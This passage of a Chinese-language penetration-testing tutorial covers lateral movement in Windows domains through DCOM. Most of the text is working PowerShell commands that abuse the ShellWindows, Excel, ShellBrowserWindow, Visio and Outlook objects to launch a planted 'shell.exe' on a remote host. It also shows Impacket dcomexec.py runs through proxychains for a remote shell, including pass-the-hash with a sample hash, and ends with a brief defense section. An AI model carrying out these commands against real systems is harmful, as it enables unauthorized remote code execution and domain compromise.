2008执行远程命令，执行位于Windows Server 2008的c盘里的马：
    # 通过PowerShell与DCOM进行远程交互，创建ShellWindows对象的实例:
    $com=[Activator]::CreateInstance([Type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39',"192.168.52.138"))
    # 然后执行如下命令，我们就可以调用该对象的"ShellExecute"方法在远程主机上启动进程:
    $com.item().Document.Application.ShellExecute("cmd.exe","/c C:\shell.exe","c:\windows\system32",$null,0)
    # 完整的命令:
    [Activator]::CreateInstance([Type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39',"192.168.52.138")).item().Document.Application.ShellExecute("cmd.exe","/c C:\shell.exe","c:\windows\system32",$null,0)
如上图所示，内网中的Windows Server 2008主机成功上线。
以上这两种方法均适用于Windows 7~Windows 10、Windows Server 2008~Windows Server 2016的系统。
并且无论是否事先建立ipc连接都可以成功执行命令，也就不需要对方主机的凭据，只只需要当前主机的管理员权限即可。
除了MMC20.Application和ShellWindows，还有以下这几种DCOM对象都可以被我们利用。
### （3）调用Excel.Application远程执行命令
使用方法如下：
    # 通过PowerShell与DCOM进行远程交互，创建Excel.Application对象的实例:
    $com = [activator]::CreateInstance([type]::GetTypeFromprogID("Excel.Application","192.168.52.138"))
    $com.DisplayAlerts = $false
    # 然后执行如下命令，我们就可以调用该对象的"DDEInitiate"方法在远程主机上启动进程:
    $com.DDEInitiate("cmd.exe","/c C:\shell.exe")
### （4）调用ShellBrowserWindow远程执行命令
使用条件：适用于Windows 10和Windows Server 2012 R2等版本的系统。
使用方法如下：
    # 通过PowerShell与DCOM进行远程交互，创建Excel.Application对象的实例:
    $com = [activator]::CreateInstance([type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880","192.168.52.138"))
    # 然后执行如下命令，我们就可以调用该对象的"shellExecute"方法在远程主机上启动进程:
    $com.Document.Application.shellExecute("C:\shell.exe")
    # 完整的命令:
    [activator]::CreateInstance([type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880","192.168.52.138")).Document.Application.shellExecute("C:\shell.exe")
### （5）调用Visio.Application远程执行命令
使用条件：目标主机中安装有Visio。
使用方法如下：
    # 通过PowerShell与DCOM进行远程交互，创建Visio.Application对象的实例:
    $com = [activator]::CreateInstance([type]::GetTypeFromProgID("Visio.Application","192.168.52.138"))
    # 然后执行如下命令，我们就可以调用该对象的"shellExecute"方法在远程主机上启动进程:
    $com.[0].Document.Application.shellExecute("calc.exe")
    # 完整的命令:
    [activator]::CreateInstance([type]::GetTypeFromProgID("Visio.Application","192.168.52.138")).[0].Document.Application.shellExecute("C:\shell.exe")
### （6）调用Outlook.Application远程执行命令
使用条件：目标主机中安装有Outlook。
通过Outlook创建Shell.Application对象来实现命令行执行：
    # 通过PowerShell与DCOM进行远程交互，创建Visio.Application对象的实例:
    $com = [activator]::CreateInstance([type]::GetTypeFromProgID("Outlook.Application","192.168.52.138"))
    # 然后执行如下命令，通过Outlook创建Shell.Application对象并执行命令:
    $com.createObject("Shell.Application").shellExecute("C:\shell.exe")
    # 完整的命令:
    [activator]::CreateInstance([type]::GetTypeFromProgID("Outlook.Application","192.168.52.138")).createObject("Shell.Application").shellExecute("C:\shell.exe")
## Impacket里的dcomexec.py脚本
Impacket 里面提供的 dcomexec.py 脚本可以提供一个类似于 wmiexec.py
脚本的半交互式shell，但使用的是DCOM，目前支持MMC20.Application，ShellWindows和ShellBrowserWindow对象。
命令格式如下：
    ./dcomexec.py domain/username:password@ip
    ./dcomexec.py domain/username:password@ip 
实验环境：
假设攻击者已经获得了域内主机Windows Server
2012的控制权，并获得了域管理员的用户名和密码，下面演示使用dcomexec.py脚本进一步获取Windows 7的shell。Windows
Server 2012除具有内网IP以外还具有公网IP，Windows 7只有没有公网IP，只有内网IP。
首先我们在Windows Server 2012上上传代理程序，在Windows Server
2012的1080端口上搭建一个socks代理服务器，然后攻击者配置一下proxychains：
此时，我们便可以使用proxychains将攻击者的dcomexec.py代理进入内网了：
    proxychains4 python3 ./dcomexec.py god/administrator:PI:EMAIL  // 获取目标主机的shell
    proxychains4 python3 ./dcomexec.py god/administrator:PI:EMAIL whoami  // 在目标主机上执行命令
如果没有获取到明文密码，我们还可以直接利用哈希值来代替
    proxychains4 python3 ./dcomexec.py administrator:@192.168.52.143 whoami -hashes aad3b435b51404eeaad3b435b51404ee:d8f69f9520b448174136e49a1051ef07
## 防御DCOM横向移动
首要的方法是启动域防火墙，因为默认情况下这会阻止DCOM对象的实例化。但尽管我们开启了防火墙，攻击者仍然可以通过某些方法远程篡改或关闭Windows防火墙。所以，我们还需要进一步设置，详情请看：
。
## Ending......
> 参考：
>
> 
>
> 
>
> 
>
> 
>
> [https://3gstudent.github.io/3gstudent.github.io/域渗透-> 利用DCOM在远程系统执行程序/](https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8DCOM%E5%9C%A8%E8%BF%9C%E7%A8%8B%E7%B3%BB%E7%BB%9F%E6%89%A7%E8%A1%8C%E7%A8%8B%E5%BA%8F/)
>
> 
>
> 